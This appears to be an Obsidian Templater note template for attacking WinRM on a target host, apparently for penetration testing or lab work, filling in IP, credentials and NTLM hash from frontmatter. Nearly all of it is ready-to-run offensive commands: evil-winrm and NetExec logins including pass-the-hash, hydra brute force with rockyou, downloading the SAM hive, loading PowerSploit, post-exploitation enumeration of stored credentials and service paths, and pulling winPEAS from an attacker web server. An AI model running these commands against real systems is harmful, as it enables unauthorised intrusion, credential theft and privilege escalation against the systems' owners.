# WinRM — Port <% tp.frontmatter.current_port %>
<%*
let port = parseInt(tp.frontmatter.current_port)
let ip = tp.frontmatter.target_ip
let domain = tp.frontmatter.domain
let user = tp.frontmatter.username || '<user>'
let pass = tp.frontmatter.password || '<pass>'
let https = port === 5986
-%>

> [!info] WinRM (Windows Remote Management) uses HTTP(5985) or HTTPS(5986). It's the PowerShell Remoting transport. Members of **Remote Management Users** or **Administrators** can connect.

---

## Nmap
```bash
nmap -p<% port %> --script=http-auth-finder,http-title <% ip %>
```

```bash
# Check WinRM availability
curl -sk http<%- https ? 's' : '' %>://<% ip %>:<% port %>/wsman
```

---

## Connect — evil-winrm (Linux)
```bash
evil-winrm -i <% ip %> -u '<% user %>' -p '<% pass %>'
```

```bash
# With domain
evil-winrm -i <% ip %> -u '<% user %>' -p '<% pass %>' -d '<% domain %>'
```

```bash
# Pass the Hash
evil-winrm -i <% ip %> -u '<% user %>' -H '<% tp.frontmatter.ntlm_hash || 'NTLM_HASH' %>'
```

```bash
# With certificate / HTTPS (port 5986)
evil-winrm -i <% ip %> -u '<% user %>' -p '<% pass %>' -S
```

```bash
# Upload / Download files inside evil-winrm session
upload /local/path/file.exe
download C:\Windows\System32\SAM
```

```bash
# Load PowerShell scripts from attacker
evil-winrm -i <% ip %> -u '<% user %>' -p '<% pass %>' -s /opt/PowerSploit/Recon/ -e /opt/
# Then inside session: menu → select loaded scripts
```

---

## Connect — PowerShell Remoting (Windows attacker)
```powershell
# Enable WSMan
winrm quickconfig

# Create credential
$SecPass = ConvertTo-SecureString '<% pass %>' -AsPlainText -Force
$Cred = New-Object PSCredential('<% domain %>\<% user %>', $SecPass)

# Interactive session
Enter-PSSession -ComputerName <% ip %> -Credential $Cred

# Run single command
Invoke-Command -ComputerName <% ip %> -Credential $Cred -ScriptBlock { whoami; hostname; ipconfig }
```

```powershell
# Persistent session (reuse without re-auth)
$Session = New-PSSession -ComputerName <% ip %> -Credential $Cred
Invoke-Command -Session $Session -ScriptBlock { whoami }
Enter-PSSession -Session $Session
```

---

## Connect — NetExec
```bash
nxc winrm <% ip %> -u '<% user %>' -p '<% pass %>'
```

```bash
nxc winrm <% ip %> -u '<% user %>' -p '<% pass %>' -x 'whoami'
```

```bash
nxc winrm <% ip %> -u '<% user %>' -p '<% pass %>' -X 'whoami'
```

```bash
# Pass the Hash
nxc winrm <% ip %> -u '<% user %>' -H '<% tp.frontmatter.ntlm_hash || 'NTLM_HASH' %>'
```

---

## Brute Force
```bash
nxc winrm <% ip %> -u users.txt -p passwords.txt --no-bruteforce
```

```bash
hydra -l '<% user %>' -P /usr/share/wordlists/rockyou.txt winrm://<% ip %> -s <% port %>
```

---

## Post-Exploitation via evil-winrm
```powershell
# Inside evil-winrm shell:

# Who am I?
whoami /all

# System info
systeminfo

# Enumerate AD (if domain joined)
net user /domain
net group "Domain Admins" /domain

# Find interesting files
Get-ChildItem C:\Users -Recurse -Include "*.txt","*.xml","*.ini","*.conf","*.ps1" -ErrorAction SilentlyContinue

# Check for stored credentials
cmdkey /list

# Get running processes
Get-Process | Sort-Object CPU -Descending | Select -First 20

# Check unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
```

---

## Upload Tools and Execute
```bash
# evil-winrm has built-in upload
upload /opt/winPEAS/winPEASx64.exe
# Then inside session:
./winPEASx64.exe
```

```powershell
# Or download from your web server
(New-Object Net.WebClient).DownloadFile('http://<% tp.frontmatter.my_ip %>/winPEAS.exe', 'C:\Temp\winPEAS.exe')
```

---

## Notes
